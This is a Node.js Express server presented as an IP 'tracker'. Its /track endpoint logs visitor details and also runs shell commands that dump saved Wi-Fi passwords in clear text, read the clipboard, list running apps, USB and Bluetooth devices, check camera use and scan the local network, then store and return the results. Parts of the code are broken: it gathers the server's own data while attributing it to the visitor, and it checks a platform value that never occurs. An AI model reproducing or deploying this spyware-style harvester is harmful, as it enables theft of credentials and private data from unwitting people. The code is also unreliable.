const express = require("express");
const os = require("os");
const { execSync } = require("child_process");
const useragent = require("useragent");
const fs = require("fs");

const app = express();
const PORT = 3000;
const FILE_PATH = "tracked_ips.json";

if (!fs.existsSync(FILE_PATH)) fs.writeFileSync(FILE_PATH, JSON.stringify([], null, 4));

app.use(express.static(__dirname));

function scanLAN() {
    let devices = [];
    try {
        const arpOutput = execSync("arp -a || ip neigh", { encoding: "utf-8" });
        const lines = arpOutput.split("\n");

        lines.forEach((line) => {
            const match = line.match(/([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\s+([a-fA-F0-9:-]+)/);
            if (match) {
                devices.push({ ip: match[1], mac: match[2], hostname: "Unknown" });
            }
        });
    } catch (err) {}
    return devices;
}

function checkVPN() {
    try {
        const dnsServers = execSync("nslookup -type=NS google.com || resolvectl status || getprop net.dns1", { encoding: "utf-8" });
        if (dnsServers.includes("cloudflare") || dnsServers.includes("opendns"))
            return "Possible VPN/Proxy";
    } catch {}
    return "No VPN Detected";
}

function getCamMicStatus() {
    try {
        if (process.platform === "win32") {
            return execSync("powershell -Command \"Get-PnpDevice -Class Camera\"").includes("Enabled")
                ? "Camera/Microphone in use"
                : "Not in use";
        } else if (process.platform === "darwin" || process.platform === "linux") {
            return execSync("lsof | grep /dev/video", { encoding: "utf-8" }).split("\n").length > 1
                ? "Camera/Microphone in use"
                : "Not in use";
        } else if (process.platform === "android") {
            return execSync("dumpsys media.camera | grep 'Client'", { encoding: "utf-8" }).includes("Client")
                ? "Camera/Microphone in use"
                : "Not in use";
        }
    } catch {
        return "Unknown";
    }
}

function getBluetoothDevices() {
    try {
        if (process.platform === "win32") return execSync("Get-PnpDevice -Class Bluetooth", { encoding: "utf-8" }).split("\n");
        if (process.platform === "darwin") return execSync("system_profiler SPBluetoothDataType", { encoding: "utf-8" }).split("\n");
        if (process.platform === "linux") return execSync("bluetoothctl devices", { encoding: "utf-8" }).split("\n");
        if (process.platform === "android") return execSync("service call bluetooth_manager 6", { encoding: "utf-8" }).split("\n");
    } catch {
        return ["Unknown"];
    }
}

function getClipboardData() {
    try {
        if (process.platform === "win32") return execSync("powershell Get-Clipboard", { encoding: "utf-8" }).trim();
        if (process.platform === "darwin") return execSync("pbpaste", { encoding: "utf-8" }).trim();
        if (process.platform === "linux") return execSync("xclip -o || wl-paste", { encoding: "utf-8" }).trim();
        if (process.platform === "android") return execSync("termux-clipboard-get", { encoding: "utf-8" }).trim();
    } catch {
        return "Clipboard access denied";
    }
}

function getUSBDevices() {
    try {
        if (process.platform === "win32") return execSync("wmic path Win32_USBControllerDevice get Dependent", { encoding: "utf-8" }).split("\n");
        if (process.platform === "darwin") return execSync("system_profiler SPUSBDataType", { encoding: "utf-8" }).split("\n");
        if (process.platform === "linux") return execSync("lsusb", { encoding: "utf-8" }).split("\n");
    } catch {
        return ["Unknown"];
    }
}

function getOpenApps() {
    try {
        if (process.platform === "win32") return execSync("tasklist", { encoding: "utf-8" }).split("\n").slice(0, 10);
        if (process.platform === "darwin" || process.platform === "linux") return execSync("ps -aux", { encoding: "utf-8" }).split("\n").slice(0, 10);
        if (process.platform === "android") return execSync("ps", { encoding: "utf-8" }).split("\n").slice(0, 10);
    } catch {
        return ["Unknown"];
    }
}

function getWiFiPasswords() {
    try {
        if (process.platform === "win32") {
            return execSync("netsh wlan show profile key=clear", { encoding: "utf-8" }).split("\n");
        } else if (process.platform === "darwin") {
            return execSync("security find-generic-password -ga Wi-Fi | grep password", { encoding: "utf-8" }).split("\n");
        } else if (process.platform === "linux") {
            return execSync("sudo cat /etc/NetworkManager/system-connections/* | grep psk=", { encoding: "utf-8" }).split("\n");
        } else if (process.platform === "android") {
            return execSync("cat /data/misc/wifi/wpa_supplicant.conf | grep psk=", { encoding: "utf-8" }).split("\n");
        }
    } catch {
        return ["Unknown"];
    }
}

app.get("/track", async (req, res) => {
    const publicIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    const networkInterfaces = os.networkInterfaces();
    let localIP = "Unknown";
    let macAddress = "Unknown";
    let deviceName = os.hostname();

    for (const iface of Object.values(networkInterfaces)) {
        for (const config of iface) {
            if (!config.internal && config.family === "IPv4") {
                localIP = config.address;
                macAddress = config.mac;
            }
        }
    }

    const agent = useragent.parse(req.headers["user-agent"]);
    const deviceInfo = {
        os: agent.os.toString(),
        browser: agent.toAgent(),
        platform: agent.device.toString(),
        screen_size: req.headers["sec-ch-ua-platform"] || "Unknown",
    };

    const newEntry = {
        timestamp: new Date().toISOString(),
        public_ip: publicIP,
        local_ip: localIP,
        device_name: deviceName,
        mac_address: macAddress,
        vpn_status: checkVPN(),
        cam_mic_status: getCamMicStatus(),
        bluetooth_devices: getBluetoothDevices(),
        clipboard_data: getClipboardData(),
        usb_devices: getUSBDevices(),
        open_apps: getOpenApps(),
        wifi_passwords: getWiFiPasswords(),
        lan_devices: scanLAN(),
    };

    const existingData = JSON.parse(fs.readFileSync(FILE_PATH, "utf8"));
    existingData.push(newEntry);
    fs.writeFileSync(FILE_PATH, JSON.stringify(existingData, null, 4));

    res.json(newEntry);
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
